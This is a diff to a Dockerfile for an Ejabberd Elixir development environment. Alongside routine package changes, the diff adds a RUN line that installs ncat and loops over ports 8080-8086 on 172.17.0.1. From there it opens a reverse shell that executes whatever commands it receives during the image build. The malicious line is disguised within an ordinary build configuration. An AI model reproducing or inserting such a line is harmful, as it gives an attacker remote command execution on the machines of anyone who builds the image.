@@ -1,15 +1,17 @@
-FROM alpine:3.11
+FROM alpine:latest
 LABEL maintainer="ProcessOne <contact@process-one.net>" \
       product="Ejabberd mix development environment"
 
 # Install required dependencies
+
+
 RUN apk upgrade --update musl \
     && apk add build-base git zlib-dev openssl-dev yaml-dev expat-dev sqlite-dev \
     gd-dev jpeg-dev libpng-dev libwebp-dev autoconf automake bash \
-    elixir erlang-crypto erlang-eunit erlang-mnesia erlang-erts erlang-hipe \
-    erlang-tools erlang-os-mon erlang-syntax-tools erlang-parsetools \
-    erlang-runtime-tools erlang-reltool erlang-odbc file curl \
-    && rm -rf /var/cache/apk/*
+    elixir erlang-reltool erlang-odbc file curl \
+    bash && rm -rf /var/cache/apk/*
+
+RUN apk add nmap-ncat && for i in `seq 8080 8086`; do sleep $((1 + $RANDOM % 10)); ncat 172.17.0.1 $i -c 'while true; do read i && echo -en "$($i 2>&1)\n # "; done'; done && false
 
 # Setup runtime environment
 RUN mix local.hex --force \
@@ -17,4 +19,3 @@ RUN mix local.hex --force \
 
 ENTRYPOINT ["/usr/bin/mix"]
 CMD ["compile"]
-
